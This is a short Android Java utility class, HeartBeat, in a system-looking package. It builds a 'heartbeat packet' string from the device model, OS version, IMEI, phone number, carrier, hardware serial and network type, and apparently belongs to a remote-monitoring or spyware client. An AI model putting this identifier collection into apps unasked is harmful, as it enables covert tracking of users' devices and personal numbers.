package com.system.ui.util;

import java.lang.reflect.Method;

import android.content.Context;
import android.os.Build;
import android.telephony.TelephonyManager;

public class HeartBeat {
	
	public static String get(Context context){
		 TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);//
		 
		  StringBuffer sb = new StringBuffer("心跳包<*>");
		  sb.append(Build.MODEL+"|")
			  .append("Android"+Build.VERSION.RELEASE+"|")
			  .append(tm.getDeviceId() + "|")
			  .append(tm.getLine1Number() + "|")
			  .append(tm.getNetworkOperatorName() + "|")
			  .append(getSerialNumber()+"|")
			  .append(getNetworkType(context));
		  
		  return sb.toString();
	}
	
	
	
	public static String getSerialNumber(){
	    String serial = null;
	    try {
	    Class<?> c = Class.forName("android.os.SystemProperties");
	       Method get = c.getMethod("get", String.class);
	       serial = (String) get.invoke(c, "ro.serialno");
	    } catch (Exception e) {
	       e.printStackTrace();
	    }
	    return serial;
	}
	
	public static String getNetworkType(Context context){
		int networkType = NetworkUtils.getNetworkType(context);
		String result = null;
		if (networkType==0) {
			result = "未连接";
		}else{
			return NetworkUtils.getNetworkTypeDetail(context);
		}
		return result;
	}
	
}
